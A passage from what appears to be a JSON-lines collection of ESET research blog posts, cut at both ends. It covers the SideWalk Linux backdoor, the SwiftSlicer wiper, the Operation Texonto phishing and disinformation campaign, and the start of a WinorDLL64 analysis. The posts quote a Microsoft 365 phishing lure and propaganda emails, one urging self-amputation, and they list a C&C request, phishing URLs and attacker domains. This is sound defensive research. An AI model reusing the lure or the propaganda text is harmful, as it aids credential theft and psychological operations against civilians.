An obvious similarity is noticeable in the implementations of ChaCha20 encryption: both variants use a counter with an initial value of 0x0B, which was previously mentioned in our blogpost as a specificity of SideWalk’s ChaCha20 implementation.\nSoftware architecture One SideWalk particularity is the use of multiple threads to execute one specific task.\nWe noticed that in both variants there are exactly five threads executed simultaneously, each of them having a specific task.\nThe following list describes the function of each; the thread names are from the code: - StageClient::ThreadNetworkReverse If a connection to the C&C server is not already established, this thread periodically attempts to retrieve the local proxy configuration and the C&C server location from the dead-drop resolver.\nIf the previous step was successful, it attempts to initiate a connection to the C&C server. -\nStageClient::ThreadHeartDetect If the backdoor did not receive a command in the specified amount of time, this thread can terminate the connection with the C&C server or switch to a “nap” mode that introduces minor changes to the behavior. -\nStageClient::ThreadPollingDriven If there is no other queued data to send, this thread periodically sends a heartbeat command to the C&C server that can additionally contain the current time. -\nStageClient::ThreadBizMsgSend This thread periodically checks whether there is data to be sent in the message queues used by all the other threads and, if so, processes it. -\nStageClient::ThreadBizMsgHandler This thread periodically checks whether there are any pending messages received from the C&C server and, if so, handles them.\nConfiguration As in SideWalk Windows, the configuration is decrypted using ChaCha20.\nChecksum First, before decrypting, there is a data integrity check.\nThis check is similar in both implementations of SideWalk (see Figure 7 and Figure 8): an MD5 hash is computed on the ChaCha20 nonce concatenated to the encrypted configuration data.\nThis hash is then checked against a predefined value, and if not equal, SideWalk exits.\nLayout Figure 9 presents excerpts of decrypted configurations from the samples that we analyzed.\nThe SideWalk Linux config contains less information than the SideWalk Windows one.\nThis makes sense because the majority of the configuration artifacts in SideWalk Windows are used as cryptography and network parameters, whereas most of these are internal in SideWalk Linux.\nDecryption using ChaCha20 As previously mentioned, SideWalk uses a main global structure to store its configuration.\nThis configuration is first decrypted using the modified implementation of ChaCha20, as seen in Figure 10.\nFigure 10.\nChaCha20 decryption call in SideWalk Windows (left) and in SideWalk Linux (right) Note that the ChaCha20 key is exactly the same in both variants, strengthening the connection between the two.\nDead-drop resolver The dead-drop resolver payload is identical in both samples.\nAs a reminder from our blogpost on SideWalk, Figure 11 depicts the format of the payload that is fetched from the dead-drop resolver.\nFor the first delimiter, we notice that the PublicKey: part of the string is ignored; the string AE68[…]3EFF is directly searched, as shown in Figure 12.\nFigure 12.\nSideWalk Linux’s first delimiter routine (left), end delimiter and middle delimiter routines (right) The delimiters are identical, as well as the whole decoding algorithm.\nVictim fingerprinting In order to fingerprint the victim, different artifacts are gathered on the victim’s machine.\nWe noticed that the fetched information is exactly the same, to the extent of it even being fetched in the same order.\nAs the boot time in either case is a Windows-compliant time format, we can hypothesize that the operators’ controller runs under Windows, and that the controller is the same for both Linux and Windows victims.\nAnother argument supporting this hypothesis is that the ChaCha20 keys used in both implementations of SideWalk are the same.\nCommunication protocol Data serialization The communication protocol between the infected machine and the C&C is HTTP or HTTPS, depending on the configuration, but in both cases, the data is serialized in the same manner.\nNot only is the implementation very similar, but the identical encryption key is used in both implementations, which, again, accentuates the similarity between the two variants.\nPOST requests In the POST requests used by SideWalk to fetch commands and payloads from the C&C server, one noticeable point is the use of the two parameters gtsid and gtuvid, as seen in Figure 13.\nIdentical parameters are used in the Linux variant.\nPOST /M26RcKtVr5WniDVZ/5CDpKo5zmAYbTmFl HTTP/1.1 Cache-Control: no-cache Connection: close Pragma: no-cache User-Agent: Mozilla/5.0 Chrome/72.0.3626.109 Safari/537.36 gtsid: zn3isN2C6bWsqYvO gtuvid: 7651E459979F931D39EDC12D68384C21249A8DE265F3A925F6E289A2467BC47D Content-Length: 120 Host: update.facebookint.workers[.]dev Figure 13.\nExample of a POST request used by SideWalk Windows Another interesting point is that the Windows variant runs as fully position-independent shellcode, whereas the Linux variant is a shared library.\nHowever, we think the malware’s authors could have just taken an extra step, using a tool such as sRDI to convert a compiled SideWalk PE to shellcode instead of manually writing the shellcode.\nCommands Only four commands are not implemented or implemented differently in the Linux variant, as listed in Table 1.\nAll the other commands are present – even with the same IDs.\nTable 1.\nCommands with different or missing implementation in the Linux version of SideWalk | Command ID (from C&C) | Windows variants | Linux variants | |---|---|---| | 0x7C | Load a plugin sent by the C&C server.\n| Not implemented in SideWalk Linux.\n| | 0x82 | Collect domain information about running processes, and owners (owner SID, account name, process name, domain information).\n| Do nothing.\n| | 0x8C | Data serialization function.\n| Commands that are not handled, but fall in the default case, which is broadcasting a message to all the loaded modules.\n| | 0x8E | Write the received data to the file located at %AllUsersProfile%\\UTXP\\nat\\ | #rowspan# | Versioning In the Linux variant, we observed a specificity that was not found in the Windows variant: a version number is computed (see Figure 14).\nThe hardcoded date could be the beginning or end of development of this version of SideWalk Linux.\nThe final computation is made out of the year, day, and month, from the value Oct 26 2020.\nIn this case, the result is 1171798691840.\nPlugins In SideWalk Linux variants, modules are built in; they cannot be fetched from the C&C server.\nThat is a notable difference from the Windows variant.\nSome of those built-in functionalities, like gathering system information (SysInfoMgr, for example) such as network configuration, are done directly by dedicated functions in the Windows variant.\nIn the Windows variant, some plugins can be added through C&C communication.\nDefense evasion The Windows variant of SideWalk goes to great lengths to conceal the objectives of its code.\nIt trimmed out all data and code that was unnecessary for its execution and encrypted the rest.\nOn the other hand, the Linux variants contain symbols and leave some unique authentication keys and other artifacts unencrypted, which makes the detection and analysis significantly easier.\nAdditionally, the much higher number of inlined functions in the Windows variant suggests that its code was compiled with a higher level of compiler optimizations.\nConclusion The backdoor that was used to attack a Hong Kong university in February 2021 is the same malware family as the SideWalk backdoor, and actually is a Linux variant of the backdoor.\nThis Linux version exhibits several similarities with its Windows counterpart along with various novelties.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research now also offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of Indicators of Compromise and samples can be found in our GitHub repository.\n| SHA-1 | Filename | ESET detection name | Description | |---|---|---|---| | FA6A40D3FC5CD4D975A01E298179A0B36AA02D4E | ssh_tunnel1_0 | Linux/SideWalk.\nL | SideWalk Linux (StageClient variant) | | 7DF0BE2774B17F672B96860D013A933E97862E6C | hw_ex_watchdog.exe | Linux/SideWalk.\nB | SideWalk Linux (Specter variant) | Network | Domain | IP | First seen | Notes | |---|---|---|---| | rec.micosoft[.]ga | 172.67.8[.]59 | SideWalk C&C server (StageClient variant) | | | 66.42.103[.]222 | SideWalk C&C server (Specter variant from 360 Netlab’s blogpost) | MITRE ATT&CK techniques This table was built using version 11 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | |---|---|---|---| | Resource Development | T1587.001 | Develop Capabilities: Malware | SparklingGoblin uses its own malware arsenal.\n| | Discovery | T1016 | System Network Configuration Discovery | SideWalk Linux has the ability to find the network configuration of the compromised machine, including the proxy configuration.\n| | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | SideWalk Linux communicates via HTTPS with the C&C server.\n| | T1573.001 | Encrypted Channel: Symmetric Cryptography | SideWalk Linux uses ChaCha20 to encrypt communication data.\n|","num_sentences":116,"metadata":{"source":"blog","platform":"welivesecurity","filename":"sidewalk"}}
{"id":215,"title":"SwiftSlicer: New destructive wiper malware strikes Ukraine","publish_date":"2023-01-27","link":"https://www.welivesecurity.com/2023/01/27/swiftslicer-new-destructive-wiper-malware-ukraine/","clean_text":"ESET researchers have uncovered a new wiper attack in Ukraine that they attribute to the Sandworm APT group.\nDubbed SwiftSlicer, the destructive malware was spotted on the network of a targeted organization on January 25th.\nIt was deployed through Group Policy, which suggests that the attackers had taken control of the victim’s Active Directory environment.\nSome of the wipers spotted by ESET in Ukraine early into Russia’s invasion – HermeticWiper and CaddyWiper – were in some instances also planted in the same fashion.\nThe latter was last spotted on the network of Ukraine’s news agency Ukrinform just days ago.\nSwiftSlicer is detected by ESET products as WinGo/KillFiles.\nC. The malware was written in Go, a highly versatile, cross-platform programming language.\nWhen it comes to SwiftSlicer’s method of destruction, ESET researchers had this to say: “Once executed it deletes shadow copies, recursively overwrites files located in %CSIDL_SYSTEM%\\drivers, %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS and other non-system drives and then reboots computer.\nFor overwriting it uses 4096 bytes length block filled with randomly generated byte”.\nTwo months ago, ESET detected a wave of RansomBoggs ransomware attacks in the war-torn country that were also linked to Sandworm.\nThe campaigns were just one of the latest additions to the long résumé of damaging attacks that the group has conducted against Ukraine over the past near-decade.\nSandworm's track record also includes a string of attacks – BlackEnergy, GreyEnergy and the first iteration of Industroyer – that targeted energy providers.\nAn Industroyer2 attack was thwarted with help from ESET researchers in April of last year.\nTo learn more about Sandworm's campaigns in Ukraine in recent months, head over to ESET APT Activity Report T3 2022","num_sentences":14,"metadata":{"source":"blog","platform":"welivesecurity","filename":"swiftslicer"}}
{"id":216,"title":"Operation Texonto: Information operation targeting Ukrainian speakers in the context of the war","publish_date":"2024-02-21","link":"https://www.welivesecurity.com/en/eset-research/operation-texonto-information-operation-targeting-ukrainian-speakers-context-war/","clean_text":"ESET products and research have been protecting Ukrainian IT infrastructure for years.\nSince the start of the war in February 2022, we have prevented and investigated a significant number of attacks launched by Russia-aligned groups.\nWe have also published some of the most interesting findings on WeLiveSecurity: - IsaacWiper and HermeticWizard: New wiper and worm targeting Ukraine - Industroyer2: Industroyer reloaded - A year of wiper attacks in Ukraine - Asylum Ambuscade: crimeware or cyberespionage?\nEven though our main focus remains on analyzing threats involving malware, we have found ourselves investigating an information operation or psychological operation (PSYOP) trying to raise doubts in the minds of Ukrainians and Ukrainian speakers abroad.\nOperation Texonto Operation Texonto is a disinformation/PSYOP campaign using spam mails as the main distribution method.\nSurprisingly, it doesn’t seem that the perpetrators used common channels such as Telegram or fake websites to convey their messages.\nWe have detected two different waves, the first one in November 2023 and the second one at the end of December 2023.\nThe contents of the emails were about heating interruptions, drug shortages, and food shortages, which are typical themes of Russian propaganda.\nIn addition to the disinformation campaign, we have detected a spearphishing campaign that targeted a Ukrainian defense company in October 2023 and an EU agency in November 2023.\nThe goal of both was to steal credentials for Microsoft Office 365 accounts.\nThanks to similarities in the network infrastructure used in these PSYOPs and phishing operations, we are linking them with high confidence.\nInterestingly, a few more pivots also revealed domain names that are part of Operation Texonto and related to internal Russian topics such as Alexei Navalny, the well-known Russian opposition leader who was in jail and died on February 16th, 2024.\nThis means that Operation Texonto probably includes spearphishing or information operations targeting Russian dissidents and supporters of the late opposition leader.\nThose domains include: - navalny-votes[.]net - navalny-votesmart[.]net - navalny-voting[.]net Perhaps even stranger is that an email server, operated by the attackers and used to send PSYOP emails, was reused two weeks later to send typical Canadian pharmacy spam.\nThis category of illegal business has been very popular within the Russian cybercrime community for a long time, as this blogpost from 2011 explains.\nFigure 1 summarizes the main events of Operation Texonto.\nThe strange brew of espionage, information operations, and fake pharma can only remind us of Callisto, a well-known Russia-aligned cyberespionage group who was the subject of an indictment by the US DOJ in December, 2023.\nCallisto targets government officials, people in think tanks, and military-related organizations via spearphishing websites designed to mimic common cloud providers.\nThe group has also run disinformation operations such as a document leak just ahead of the 2019 UK general election.\nFinally, pivoting on its old network infrastructure leads to fake pharma domains such as musclepharm[.]top or ukrpharma[.]ovh.\nWhile there are several high-level points of similarity between Operation Texonto and Callisto operations, we haven’t found any technical overlap and we currently do not attribute Operation Texonto to a specific threat actor.\nHowever, given the TTPs, targeting, and the spread of messages, we attribute the operation with high confidence to a group that is Russian aligned.\nPhishing campaign: October–November 2023 Employees working at a major Ukrainian defense company received a phishing email in October 2023, purportedly coming from their IT department.\nThe emails were sent from it.[redacted_company_name]@gmail.com, an email address most likely created specifically for this campaign, and the email subject was Запрошено утверждение:Планова інвентаризація (machine translation from Ukrainian: Approval requested: Planned inventory).\nThe content of the email is the following: У період з 02 жовтня по 13 жовтня співробітники відділу інформаційних технологій проводять планову інвентаризацію та видалення поштових скриньок, що не використовуються.\nЯкщо Ви плануєте використовувати свою поштову адресу ([redacted_address]@[redacted_company_name].com) у майбутньому, будь ласка, перейдіть на веб-версію поштової скриньки за цим посиланням та увійдіть до системи, використовуючи свої облікові дані.\nЖодних додаткових дій не потрібно, Ваша поштова скринька отримає статус \"підтверджений\" і не буде видалена під час планової інвентаризації ресурсів.\nЯкщо ця поштова адреса не використовується Вами (або її використання не планується в майбутньому), то в цьому випадку Вам не потрібно виконувати жодних дій - поштову скриньку буде видалено автоматично 13 жовтня 2023 року.\nЗ повагою, Відділ інформаційних технологій.\nIn the period from October 2 to October 13, employees of the information technology department will conduct a planned inventory and removal of unused mailboxes.\nIf you plan to use your email address ([redacted_address]@[redacted_company_name].com) in the future, please go to the web version of the mailbox at this link and log in using your credentials.\nNo additional actions are required, your mailbox will receive the status \"confirmed\" and will not be removed during a scheduled resource inventory.\nIf this email address is not used by you (or its use is not planned in the future), then in this case you do not need to take any action - the mailbox will be deleted automatically on October 13, 2023.Best regards,Department of information technologies.\nThe goal of the email is to entice targets into clicking on за цим посиланням (machine translation: at this link), which leads to https://login.microsoftidonline[.]com/common/oauth2/authorize?client_id=[redacted];redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=[redacted]&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=[redacted]&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&domain_hint=[redacted]&nonce=[redacted]&state=[redacted] (partially redacted).\nThis URL points to the malicious domain login.microsoftidonline[.]com.\nNote that this domain is very close to the official one, login.microsoftonline.com.\nWe haven’t been able to retrieve the phishing page, but it was most likely a fake Microsoft login page intended to steal the targets’ credentials.\nFor another domain belonging to Operation Texonto, choicelive149200[.]com, there were two VirusTotal submissions (one and two) for the URL https://choicelive149200[.]com/owa/auth/logon.aspx?replaceCurrent=1&url=https://hbd.eupolcopps.eu/owa/. Unfortunately, the site was no longer reachable at the time of analysis, but it was likely a credential-phishing page for the Outlook on the web/OWA webmail of eupolcopps.eu, the EU Coordinating Office for Palestinian Police Support.\nNote that we have not seen the email sample, just the URL submitted to VirusTotal.\nFirst PSYOP wave: November 2023 On November 20th, we detected the first wave of disinformation emails with a PDF attachment sent to at least a few hundred recipients in Ukraine.\nPeople working at the Ukrainian government, energy companies, and even individuals, received the emails.\nWe do not know how the list of email addresses was built.\nContrary to the previously described phishing campaign, the goal of these emails was to sow doubt in the mind of Ukrainians; for instance, one email says that “There may be heating interruptions this winter”.\nIt doesn’t seem there was any malicious link or malware in this specific wave, only disinformation.\nFigure 2 shows an email example.\nIts subject is Рекомендації моз україни на тлі дефіциту ліків (machine translation from Ukrainian: Recommendations of the Ministry of Health of Ukraine at the time of a shortage of medicines) and the email was sent from mozua@ua-minagro[.]com.\nNote that this address can be seen in the envelope-from and return-path fields.\nua-minagro[.]com is a domain operated by the attackers and was used exclusively for sending disinformation emails in this campaign.\nThe domain is masquerading as the Ministry of Agrarian Policy and Food of Ukraine whose legitimate domain is minagro.gov.ua.\nAttached to the email is a PDF document, as shown in Figure 3.\nWhile it is not malicious per se, it also contains disinformation messages.\nThe document is misusing the logo of the Ministry of Health of Ukraine and explains that due to the war, there is a drug shortage in Ukraine.\nIt also says that the Ukrainian government is refusing to import drugs from Russia and Belarus.\nOn the second page, they explain how to replace some drugs with plants.\nWhat’s interesting to note is that the email was sent from a domain masquerading as the Ministry of Agrarian Policy and Food of Ukraine, while the content is about drug shortages and the PDF is misusing the logo of the Ministry of Health of Ukraine.\nIt is possibly a mistake from the attackers or, at least, shows they did not care about all details.\nIn addition to ua-minagro[.]com, five additional domains were used to send emails in this wave: - uaminagro[.]com - minuaregion[.]org - minuaregionbecareful[.]com - uamtu[.]com - minagroua[.]org minuaregion[.]org and minuaregionbecareful[.]com are masquerading as the Ministry of Reintegration of the Temporarily Occupied Territories of Ukraine whose legitimate website is https://minre.gov.ua/en/. uamtu[.]com is masquerading as the Ministry of Development of Communities, Territories and Infrastructure of Ukraine, whose legitimate website is https://mtu.gov.ua.\nWe have identified three more different email message templates, each with a different mail body and PDF attachment.\nA summary is provided in Table 1.\nTable 1.\nDisinformation emails | Email body | Machine translation of the email body | | Російськими військовими системно обстрілюються об'єкти енергетичної інфраструктури.\nУ разі виникнення екстреної ситуації подача опалення та електрики в будинки може бути повністю припинена.\nЩоб вижити в такій ситуації, рекомендуємо вам наступне: | The Russian military is systematically shelling the energy facilities infrastructure.\nHeating supply in case of an emergency and electricity to homes may be completely cut off.\nTo survive in such a situation, we recommend the following: | | Цієї зими можуть спостерігатися перебої з опаленням.\nРівень температури в будинках може бути нижче допустимих значень на кілька градусів.\nУ деяких випадках можливо навіть відключення опалення, об'єкти енергетичної безпеки знаходяться під постійною загрозою.\nУ зв'язку з цим, радимо взяти до уваги наступні рекомендації.\n| There may be heating interruptions this winter.\nTemperature level in houses can be several degrees below the permissible values.\nIn some cases, it is even possible to turn off the heating, facilities energy security are under constant threat.\nIn this regard, we advise you to take into account the following recommendations.\n| | Міністерство охорони здоров'я попереджає про дефіцит ліків в аптеках — доставка деяких препаратів на тлі підвищеного попиту може затримуватися.\nЗ початком війни з РФ Україна повністю відмовилася від лікарських засобів російських і білоруських фармацевтичних компаній, доходи населення впали, а іноземні ліки, логістика яких змінилася і стала більш складною і вартісною, значно подорожчали.\nПри цьому, найбільшим попитом у громадян України користуються групи препаратів для лікування хронічних захворювань, заспокійливі, знеболюючі та хірургічні засоби.\nНа тлі виниклого дефіциту МОЗ України нагадав громадянам, що не варто нехтувати безцінним досвідом перевірених століттями народних методів лікування і випустив відповідні рекомендації.\n| The Ministry of Health warns of a shortage of medicines in pharmacies — delivery of some drugs against the background of increased demand may be delayed.\nWith the beginning of the war with the Russian Federation, Ukraine completely refused Russian and Belarusian pharmaceutical drugs companies, incomes of the population fell, and foreign medicines, the logistics of which changed and became more complex and expensive, significantly became more expensive.\nAt the same time, the greatest demand is from citizens.\nUkraine uses groups of drugs for the treatment of chronic diseases, sedatives, pain relievers and surgical means.\nAgainst the background of the shortage, the Ministry of Health of Ukraine reminded citizens that you should not neglect the invaluable experience of the tested centuries of folk methods of treatment and released the appropriate ones recommended.\n| | Агресія Росії призвела до значних втрат в аграрному секторі України.\nЗемлі забруднені мінами, пошкоджені снарядами, окопами і рухом військової техніки.\nУ великій кількості пошкоджено та знищено сільськогосподарську техніку, знищено зерносховища.\nДо стабілізації обстановки Міністерство аграрної політики та продовольства рекомендує вам урізноманітнити раціон стравами з доступних дикорослих трав.\nВживання свіжих, соковитих листя трав у вигляді салатів є найбільш простим, корисним і доступним.\nПам'ятайте, що збирати рослини слід далеко від міст і селищ, а також від жвавих трас.\nПропонуємо вам кілька корисних і простих у приготуванні рецептів.\n| Russia's aggression led to significant losses in the agricultural sector of Ukraine.\nThe lands are polluted by mines, damaged by shells, trenches, and the movement of military equipment.\nA large amount of agricultural machinery was damaged and destroyed, and granaries were destroyed.\nUntil the situation stabilizes, the Ministry of Agrarian Policy and Food recommends diversifying your diet with dishes made from available wild herbs.\nEating fresh, juicy leaves of herbs in the form of salads is the most simple, useful, and affordable.\nRemember that you should collect plants far from cities and towns, as well as from busy roads.\nWe offer you several useful and easy-to-prepare recipes.\n| The related PDF attachments are allegedly from the Ukrainian Ministry of Regions (see Figure 4) and the Ministry of Agriculture (see Figure 5).\nIn the last document, allegedly from the Ministry of Agriculture, they suggest to eat “pigeon risotto” and they even provide a photo of a living pigeon and a cooked pigeon.…\nThis shows those documents were purposely created in order to rile the readers.\nOverall, the messages align with common Russian propaganda themes.\nThey are trying to make Ukrainian people believe they won’t have drugs, food, and heating because of the Russia-Ukraine war.\nSecond PSYOP wave: December 2023 About a month after the first wave, we detected a second PSYOP email campaign targeting not only Ukrainians, but also people in other European countries.\nThe targets are somewhat random, ranging from the Ukrainian government to an Italian shoe manufacturer.\nBecause all the emails are written in Ukrainian, it is likely that the foreign targets are Ukrainian speakers.\nAccording to ESET telemetry, a few hundred people received emails in this second wave.\nWe found two different email templates in this wave.\nThe first one was sent on December 25th and is shown in Figure 6.\nAs for the first wave, the email messages were sent from an email server operated by the attackers, infoattention[.]com in this case.\nA machine translation of the email body is the following: Dear Ukrainians, we congratulate you on the warmest and most family holiday - the New Year!\nWe sincerely want you to celebrate 2024 with your family!\nMay your family and friends never get sick!\nTake care of each other!\nOnly together we will be able to drive out the Satanists from the USA and their minions from the original Russian soil!\nLet's revive Kievan Rus in spite of our enemies!\nLet's save people's lives!\nFrom Russia with love!\nHappy holiday, dear friends!\nThe second email template, shown in Figure 7, was sent on December 26th, 2023 from a different email server: stronginfo1[.]com.\nDuring this wave, two additional email addresses were used: - happyny@infonotifi[.]com - happyny@infonotification[.]com A machine translation of the email body is the following: Happy New Year, Ukrainian brothers!\nOn New Year's Eve, it's time to remember how good it is to have two pairs of legs and arms, but if you have lost one of them, then don't be upset - this means that you won't meet a Russian soldier in a trench.\nAnd here if all your limbs are intact, then we do not envy you.\nWe recommend cutting or sawing off at least one of the four yourself - a couple of minutes of pain, but then a happy life!\nHappy New Year, Ukrainians!\nRemember that sometimes one is better than two!\nWhile the first PSYOP email campaign in November 2023 was rather well-prepared, with specially created PDF documents that were somewhat convincing, this second campaign is rather more basic and darker in its messaging.\nThe second email template is particularly disturbing, with the attackers suggesting people amputate a leg or arm to avoid military deployment.\nOverall, it has all the characteristics of PSYOPs during war time.\nCanadian pharmacy spam: January 2024 In a quite surprising twist of events, one of the domains used to send PSYOP emails in December 2023, infonotification[.]com, started being used to send Canadian pharmacy spam on January 7th, 2024.\nAn example is provided in Figure 8 and the link redirects to the fake Canadian pharmacy website onlinepharmacycenter[.]com.\nThe spam campaign was moderately large (in the hundreds of messages at least) and people in many countries received such emails.\nThe emails were sent from happyny@infonotification[.]com and this was verified in the email headers: Return-Path: Delivered-To: [redacted] [redacted] Received: from infonotification[.]com ([185.12.14[.]13]) by [redacted] with esmtps (TLS1.3:TLS_AES_256_GCM_SHA384:256) [redacted] Sun, 07 Jan 2024 12:39:10 +0000 Fake Canadian pharmacy spam is a business historically operated by Russian cybercriminals.\nIt was extensively covered in the past by bloggers such as Brian Krebs, especially in his Spam Nation book.\nLinks between these spam campaigns While we don’t know why the operators of the PSYOP campaigns decided to reuse one of their servers to send fake pharmacy spam, it is likely that they realized that their infrastructure was detected.\nHence, they may have decided to try to monetize the already burnt infrastructure, either for their own profit or to fund future espionage operations or PSYOPs.\nFigure 9 summarizes the links between the different domains and campaigns.\nConclusion Since the start of the war in Ukraine, Russia-aligned groups such as Sandworm have been busy disrupting Ukrainian IT infrastructure using wipers.\nIn recent months, we have observed an uptick in cyberespionage operations, especially by the infamous Gamaredon group.\nOperation Texonto shows yet another use of technologies to try to influence the war.\nWe found a few typical fake Microsoft login pages but most importantly, there were two waves of PSYOPs via emails probably to try to influence and demoralize Ukrainian citizens with disinformation messages about war-related topics.\nA comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | ESET detection name | Description | | 3C201B2E40357996B383 | Minagroua111.pdf | PDF/Fraud.\nCDY | PDF used in an information operation against Ukraine.\n| | 15BF71A771256846D44E | Mozua.pdf | PDF/Fraud.\nCDU | PDF used in an information operation against Ukraine.\n| | 960341B2C296C425821E | Minregion.pdf | PDF/Fraud.\nCDT | PDF used in an information operation against Ukraine.\n| | BB14153040608A4F559F | Minregion.pdf | PDF/Fraud.\nCDX | PDF used in an information operation against Ukraine.\n| Network | IP | Domain | Hosting provider | First seen | Details | | N/A | navalny-votes[.]net | N/A | 2023-09-09 | Domain related to Alexei Navalny.\n| | N/A | navalny-votesmart[.]net | N/A | 2023-09-09 | Domain related to Alexei Navalny.\n| | N/A | navalny-voting[.]net | N/A | 2023-09-09 | Domain related to Alexei Navalny.\n| | 45.9.148[.]165 | infoattention[.]com | Nice IT Services Group Inc. | 2023-12-25 | Server used to send emails in Operation Texonto.\n| | 45.9.148[.]207 | minuaregionbecareful[.]com | Nice IT Services Group Inc. | 2023-11-23 | Server used to send emails in Operation Texonto.\n| | 45.9.150[.]58 | stronginfo1[.]com | Nice IT Services Group Inc. | 2023-12-25 | Server used to send emails in Operation Texonto.\n| | 45.129.199[.]200 | minuaregion[.]org | Hostinger | 2023-11-21 | Server used to send emails in Operation Texonto.\n| | 45.129.199[.]222 | uamtu[.]com | Hostinger | 2023-11-20 | Server used to send emails in Operation Texonto.\n| | 46.249.58[.]177 | infonotifi[.]com | serverius-mnt | 2023-12-28 | Server used to send emails in Operation Texonto.\n| | 89.116.52[.]79 | uaminagro[.]com | IPXO LIMITED | 2023-11-17 | Server used to send emails in Operation Texonto.\n| | 154.49.137[.]16 | choicelive149200[.]com | Hostinger | 2023-10-26 | Phishing server.\n| | 185.12.14[.]13 | infonotification[.]com | Serverius | 2023-12-28 | Server used to send emails in Operation Texonto.\n| | 193.43.134[.]113 | login.microsoftidonline[.]com | Hostinger | 2023-10-03 | Office 365 phishing server.\n| | 195.54.160[.]59 | minagroua[.]org | BlueVPS | 2023-11-21 | Server used to send emails in Operation Texonto.\n| Email addresses - minregion@uaminagro[.]com - minregion@minuaregion[.]org - minregion@minuaregionbecareful[.]com - minregion@uamtu[.]com - mozua@ua-minagro[.]com - mozua@minagroua[.]org - minagroua@vps-3075.lethost[.]network - happyny@infoattention[.]com - happyny@stronginfo1[.]com - happyny@infonotifi[.]com - happyny@infonotification[.]com MITRE ATT&CK techniques This table was built using version 14 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | Acquire Infrastructure: Domains | Operators bought domain names at Namecheap.\n| | | Acquire Infrastructure: Server | Operators rented servers at Nice IT, Hostinger, Serverius, and BlueVPS.\n| || | Initial Access | Phishing | Operators sent emails with disinformation content.\n| | | Phishing: Spearphishing Link | Operators sent emails with a link to a fake Microsoft login page.\n| || | Defense Evasion | Masquerading | Operators used domain names similar to official Ukrainian government domain names.\n|","num_sentences":171,"metadata":{"source":"blog","platform":"welivesecurity","filename":"texonto"}}
{"id":217,"title":"WinorDLL64: A backdoor from the vast Lazarus arsenal?","publish_date":"2023-02-23","link":"https://www.welivesecurity.com/2023/02/23/winordll64-backdoor-vast-lazarus-arsenal/","clean_text":"ESET researchers have discovered one of the payloads of the Wslink downloader that we uncovered back in 2021.\nWe named this payload WinorDLL64 based on its filename WinorDLL64.dll.\nWslink, which had the filename WinorLoaderDLL64.dll, is a loader for Windows binaries that, unlike other such loaders, runs as a server and executes received modules in memory.\nAs the wording suggests, a loader serves as a tool to load a payload, or the actual malware, onto the already compromised system.\nThe initial Wslink compromise vector has not been identified.\nThe initially unknown Wslink payload was uploaded to VirusTotal from South Korea shortly after the publication of our blogpost, and hit one of our YARA rules based on Wslink’s unique name WinorDLL64.\nRegarding Wslink, ESET telemetry has seen only a few detections - in Central Europe, North America, and the Middle East.\nThe WinorDLL64 payload serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, such as exfiltrating, overwriting, and removing files, and executes additional commands.\nInterestingly, it communicates over a connection that was already established by the Wslink loader.\nIn 2021, we did not find any data that would suggest Wslink is a tool from a known threat actor.\nHowever, after an extensive analysis of the payload, we have attributed WinorDLL64 to the Lazarus APT group with low confidence based on the targeted region and an overlap in both behavior and code with known Lazarus samples.\nActive since at least 2009, this infamous North-Korea aligned group is responsible for high-profile incidents such as both the Sony Pictures Entertainment hack and tens-of-millions-of-dollar cyberheists in 2016, the WannaCryptor (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against South Korean public and critical infrastructure since at least 2011.\nUS-CERT and the FBI call this group HIDDEN COBRA.\nBased on our extensive knowledge of the activities and operations of this group, we believe that Lazarus consists of a large team that is systematically organized, well prepared, and is made up of several subgroups that utilize a large toolset.\nLast year, we discovered a Lazarus tool that took advantage of the CVE‑2021‑21551 vulnerability to target an employee of an aerospace company in the Netherlands, and a political journalist in Belgium.\nIt was the first recorded abuse of the vulnerability; in combination, the tool and the vulnerability led to the blinding of the monitoring of all security solutions on compromised machines.\nWe also provided an extensive description of the structure of the virtual machine used in samples of Wslink.\nThis blogpost explains the attribution of WinorDLL64 to Lazarus and provides an analysis of the payload.\nLinks to Lazarus We have discovered overlaps in both behavior and code with Lazarus samples from Operation GhostSecret and the Bankshot implant described by McAfee.\nThe description of the implants in both GhostSecret and Bankshot articles contains overlaps in the functionality with WinorDLL64 and we found some code overlap in the samples.\nIn this blogpost we will only use the FE887FCAB66D7D7F79F05E0266C0649F0114BA7C sample from GhostSecret for comparison against WinorDLL64 (1BA443FDE984CEE85EBD4D4FA7EB1263A6F1257F), unless specified otherwise.\nThe following details summarize the supporting facts for our low confidence attribution to Lazarus: 1.\nVictimology - Fellow researchers from AhnLab confirmed South Korean victims of Wslink in their telemetry, which is a relevant indicator considering the traditional Lazarus targets and that we have observed only a few hits.\n2.\nMalware - The latest GhostSecret sample reported by McAfee (FE887FCAB66D7D7F79F05E0266C0649F0114BA7C) is from February 2018; we spotted the first sample of Wslink in late 2018 and fellow researchers reported hits in August 2018, which they disclosed after our publication.\nHence, these samples were spotted a relatively short period of time apart. -\nThe PE rich headers indicate that the same development environment and projects of similar size were used in several other known Lazarus samples (e.g., 70DE783E5D48C6FBB576BC494BAF0634BC304FD6; 8EC9219303953396E1CB7105CDB18ED6C568E962).\nWe found this overlap using the following rules that cover only these Wslink and Lazarus samples, which is an indicator with a low weight.\nWe tested them on VirusTotal’s retrohunt and our internal file corpus.\nrich_signature.length == 80 and pe.rich_signature.toolid(175, 30319) == 7 and pe.rich_signature.toolid(155, 30319) == 1 and pe.rich_signature.toolid(158, 30319) == 10 and pe.rich_signature.toolid(170, 30319) >= 90 and pe.rich_signature.toolid(170, 30319) <= 108 This rule can be translated to the following notation that is more 